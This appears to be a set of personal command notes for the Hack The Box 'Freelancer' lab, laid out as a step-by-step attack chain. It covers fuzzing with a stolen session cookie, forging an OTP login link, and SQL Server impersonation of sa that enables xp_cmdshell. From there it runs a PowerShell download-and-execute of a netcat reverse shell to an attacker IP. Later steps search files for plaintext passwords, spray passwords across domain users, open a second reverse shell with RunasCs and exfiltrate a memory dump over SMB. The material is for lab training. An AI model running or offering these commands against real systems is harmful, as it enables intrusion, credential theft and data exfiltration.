==========(1)======================================================================================================================
See https://github.com/ajiththomas/qrcodereader/tree/main
==========(2)======================================================================================================================
#Linux command to generate numbers from 1 to 65535 and redirect them to a file
seq 1 65535 > numbers.txt
==========(3)======================================================================================================================
#Use BurpSuite to find sessionid and csrftoken and then use it for FUZZ
ffuf -u 'http://freelancer.htb/accounts/profile/visit/FUZZ/' -X GET -H 'Cookie: sessionid=4p6yyd6c1zosaiuqzfvm3xuu9nr8k08g;csrftoken=uClh0dyORb2wtB2zqDYdxc6YZuGftsE5' -w /home/mabali/numbers.txt -v
==========(4)======================================================================================================================
#find the admin page and convert page number to base64
printf "%d" 2 | base64
==========(5)======================================================================================================================
#use scanqr code to get link content
echo "http://freelancer.htb/accounts/login/otp/Mg==/43c1fd8315d35368f280e7298fdab3a8/"
==========(6)======================================================================================================================
#Enumerate what type of SQL server we're interacting
SELECT @@SERVERNAME;

#Query current user, system roles and whether or not we are currently a system administrator.
(1) SELECT SYSTEM_USER;
(2) SELECT name,roles FROM sysusers WHERE issqluser = '1'
(3) SELECT is_srvrolemember('sysadmin');

#Query if we've been granted privileges that we might be able to leverage. 
(1) SELECT name, principal_id FROM sys.server_principals WHERE name = 'Freelancer_webapp_user'
(2) SELECT grantee_principal_id, permission_name, grantor_principal_id FROM sys.server_permissions WHERE grantee_principal_id = '267';

#Impersonate sa and take full control over the SQL service. 
SELECT a.name AS grantee, b.permission_name, c.name AS grantor FROM sys.server_permissions b INNER JOIN sys.server_principals a ON b.grantee_principal_id = a.principal_id
INNER JOIN sys.server_principals c ON b.grantor_principal_id = c.principal_id WHERE b.permission_name = 'IMPERSONATE';

#Validate our findings before proceeding
EXECUTE AS LOGIN = 'sa';
SELECT is_srvrolemember('sysadmin');

#Enable xp_cmdshell and run command
#(May have to run enabling and executing command immediately followed by one another in some systems. May use EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell "whoami"; to verify code execution in other systems)
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell "powershell -ep bypass iex(iwr http://10.10.14.82:8000/reverse.ps1 -usebasicp)";
/*
//reverse.ps1
iwr http://10.10.14.82:8000/nc64.exe -outfile c:\\users\\public\\nc64.exe;
c:\\users\\public\\nc64.exe -e powershell.exe 10.10.14.82 10001
*/
==========(7)======================================================================================================================
#find password stored in in plaintext in any files
(gci: Alias for Get-ChildItem)
gci -path . -recurse -ea SilentlyContinue -Include *.txt, *.ini, *.yml, *.xml, *.ps1, *.cfg | select-string pass
gci -path . -recurse -ea SilentlyContinue -Include *.txt, *.ini, *.yml, *.xml, *.ps1, *.cfg | select-string -pattern "password\s*[:=]\s*\S+" -CaseSensitive:$false



#get list of all active directory users
get-aduser -filter * | select samaccountname
  (a) get-aduser -filter * -properties DisplayName, EmailAddress | select samaccountname, DisplayName, EmailAddress
  (b) get-aduser -filter "Name -like '*John*'" | select samaccountname
  (c) Get-ADUser -Identity <samaccountname> -Properties *
  (d) get-aduser -filter * | select samaccountname | Export-Csv -Path "ADUsers.csv" -NoTypeInformation

==========(8)======================================================================================================================
//get output of get-aduser -filter * | select samaccountname into users

netexec smb freelancer.htb -u users -p "IL0v3ErenY3ager" --continue-on-success
==========(9)======================================================================================================================
target:

iwr 10.10.14.82:8000/RunasCs.exe -outfile runascs.exe

runascs.exe mikasaAckerman 'IL0v3ErenY3ager' powershell.exe -r 10.10.14.82:9001

host:
rlwrap -cAr nc -nvlp 9001
==========(10)======================================================================================================================
host:

smbserver.py share . -username test -password t3st -smb2support
md5sum Memory.7z

target:
net use \\10.10.14.82\share /user:test t3st
xcopy MEMORY.7z \\10.10.14.82\share\
get-filehash -algorithm md5 MEMORY.7z
whoami /all
==========(11)======================================================================================================================sudo apt update
sudo apt update && sudo apt upgrade
sudo apt install cmake g++ libfuse3-dev
git clone https://github.com/ufrisk/MemProcFS.git
cd MemProcFS
mkdir build && cd build
cmake ..
make




